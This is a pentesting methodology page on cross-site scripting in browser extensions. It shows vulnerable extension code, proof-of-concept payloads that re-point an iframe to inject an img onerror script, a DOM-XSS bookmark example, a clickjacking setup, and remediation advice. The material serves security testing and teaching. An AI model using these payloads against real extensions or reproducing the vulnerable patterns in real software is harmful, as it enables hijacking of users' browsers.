---
title: "BrowExt - XSS Example"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## Cross-Site Scripting (XSS) through an Iframe

In this setup, a **content script** is implemented to instantiate an Iframe, incorporating a URL with query parameters as the source of the Iframe:[\[1\]](#references)

```
chrome.storage.local.get("message", (result) => {
  let constructedURL =
    chrome.runtime.getURL("message.html") +
    "?content=" +
    encodeURIComponent(result.message) +
    "&redirect=https://example.net/details"
  frame.src = constructedURL
})
```
A publicly accessible HTML page, **`message.html`**, is designed to dynamically add content to the document body based on the parameters in the URL:[\[1\]](#references)

```
$(document).ready(() => {
  let urlParams = new URLSearchParams(window.location.search)
  let userContent = urlParams.get("content")
  $(document.body).html(
    `${userContent} <button id='detailBtn'>Details</button>`
  )
  $("#detailBtn").on("click", () => {
    let destinationURL = urlParams.get("redirect")
    chrome.tabs.create({ url: destinationURL })
  })
})
```
If `message.html` is declared as a web-accessible resource for the attacker’s origin, script in the embedding page can navigate the iframe to a new extension URL containing attacker-controlled `content`. The page can read the iframe element’s `src` attribute even though it cannot read the cross-origin extension document itself.[\[1\]](#references)[\[3\]](#references)

```
setTimeout(() => {
  let targetFrame = document.querySelector("iframe").src
  let baseURL = targetFrame.split("?")[0]
  let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>"
  let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`
  document.querySelector("iframe").src = maliciousURL
}, 1000)
```
In a historical Manifest V2 extension, an overly permissive Content Security Policy might look like:

```
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
However, **`'unsafe-eval'` does not authorize inline event handlers** such as this payload’s `onerror`; that requires `'unsafe-inline'`, a matching hash/nonce mechanism where applicable, or another executable gadget. Manifest V3 extension pages cannot relax `script-src` to include `'unsafe-eval'` or `'unsafe-inline'`. Therefore, first confirm the manifest version and effective CSP instead of assuming this exact payload executes.[\[4\]](#references)[\[5\]](#references)

An alternative reachability test creates an iframe and navigates it directly to the web-accessible extension page. The same web-accessible-resource and CSP constraints still apply:[\[1\]](#references)[\[3\]](#references)

```
let newFrame = document.createElement("iframe")
newFrame.src =
  "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
  encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>")
document.body.append(newFrame)
```
## DOM-based XSS + ClickJacking

This example was taken from the [original post writeup](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).[\[2\]](#references)

The core issue arises from a DOM-based Cross-site Scripting (XSS) vulnerability located in **`/html/bookmarks.html`**. The problematic JavaScript, part of **`bookmarks.js`**, is detailed below:

```
$("#btAdd").on("click", function () {
  var bookmarkName = $("#txtName").val()
  if (
    $(".custom-button .label").filter(function () {
      return $(this).text() === bookmarkName
    }).length
  )
    return false
  var bookmarkItem = $('<div class="custom-button">')
  bookmarkItem.html('<span class="label">' + bookmarkName + "</span>")
  bookmarkItem.append('<button class="remove-btn" title="delete">x</button>')
  bookmarkItem.attr("data-title", bookmarkName)
  bookmarkItem.data("timestamp", new Date().getTime())
  $("section.bookmark-container .existing-items").append(bookmarkItem)
  persistData()
})
```
This snippet fetches the **value** from the **`txtName`** input field and uses **string concatenation to generate HTML**, which is then appended to the DOM using jQuery’s `.append()` function.[\[2\]](#references)

Chrome’s extension CSP normally prevents inline script and `eval`-like execution. The historical writeup describes a particular Manifest V2 extension, jQuery version, CSP, and DOM-insertion behavior involving jQuery’s `globalEval()` and JavaScript’s `eval()`. The direct API references are retained because they help trace that historical execution path. Do not generalize the chain to every call to `.html()`: verify the bundled jQuery implementation and effective CSP, and remember that Manifest V3 forbids `'unsafe-eval'` for ordinary extension pages.[\[2\]](#references)[\[4\]](#references)[\[5\]](#references)[\[6\]](#references)[\[7\]](#references)

While this vulnerability is significant, its exploitation is usually contingent on user interaction: visiting the page, entering an XSS payload, and activating the “Add” button.[\[2\]](#references)

To enhance this vulnerability, a secondary **clickjacking** vulnerability is exploited. The Chrome extension’s manifest showcases an extensive `web_accessible_resources` policy:[\[2\]](#references)

```
"web_accessible_resources": [
    "html/bookmarks.html",
    "dist/*",
    "assets/*",
    "font/*",
    [...]
],
```
In that extension, **`/html/bookmarks.html`** was both web-accessible and frameable, enabling **clickjacking**. The attacker could frame the page and overlay decoy UI so the victim interacted with the extension page unintentionally.[\[2\]](#references)

For remediation, expose only the resources and origins that require web access, build untrusted text with `textContent`/jQuery `.text()` rather than HTML strings, validate redirect schemes and destinations, retain the strict extension-page CSP, and avoid putting privileged extension UI in a frameable web-accessible page.[\[3\]](#references)[\[4\]](#references)

## References
